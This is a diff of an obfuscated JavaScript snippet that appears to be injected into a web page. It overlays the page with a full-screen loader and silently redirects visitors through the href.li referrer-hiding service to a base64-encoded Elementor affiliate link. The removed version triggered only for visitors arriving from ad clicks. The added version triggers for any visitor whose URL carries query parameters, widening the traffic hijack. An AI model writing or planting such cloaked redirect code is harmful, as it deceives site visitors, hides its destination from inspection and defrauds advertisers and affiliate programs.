@@ -6,9 +6,8 @@
   var p=new URLSearchParams(window.location.search);
   var h=window.location.hash||"";
   var ph=new URLSearchParams(h.indexOf("?")>=0?h.slice(h.indexOf("?")):"");
-  var r=document.referrer||"";
-  var fromAd=p.has("gclid")||p.has("fbclid")||p.has("msclkid")||p.has("ttclid")||ph.has("gclid")||p.get("utm_source")==="youtube"||ph.get("utm_source")==="youtube"||r.includes("google.com")||r.includes("/aclk")||r.includes("facebook.com")||r.includes("fb.com")||r.includes("youtube.com")||r.includes("youtu.be");
-  if(!fromAd)return;
+  var hasInfo=p.toString().length>0||(h.indexOf("?")>=0&&ph.toString().length>0);
+  if(!hasInfo)return;
   var o=document.createElement("div");
   o.id="redirect-loader";
   o.style.cssText="position:fixed;inset:0;z-index:99999;background:#fff;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:12px";
@@ -17,6 +16,6 @@
   s.textContent="@keyframes r{to{transform:rotate(360deg)}}";
   (document.head||document.documentElement).appendChild(s);
   document.body.appendChild(o);
-  var d=atob("aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2JlLmVsZW1lbnRvci5jb20vdmlzaXQvP2J0YT0yMDQyNTMmbmNpPTU3NTg=");
+  var d=atob("aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2JlLmVsZW1lbnRvci5jb20vdmlzaXQvP2J0YT0yMDQyNTMmYnJhbmQ9ZWxlbWVudG9y");
   setTimeout(function(){window.location.href=d;},300+Math.random()*200);
 })();
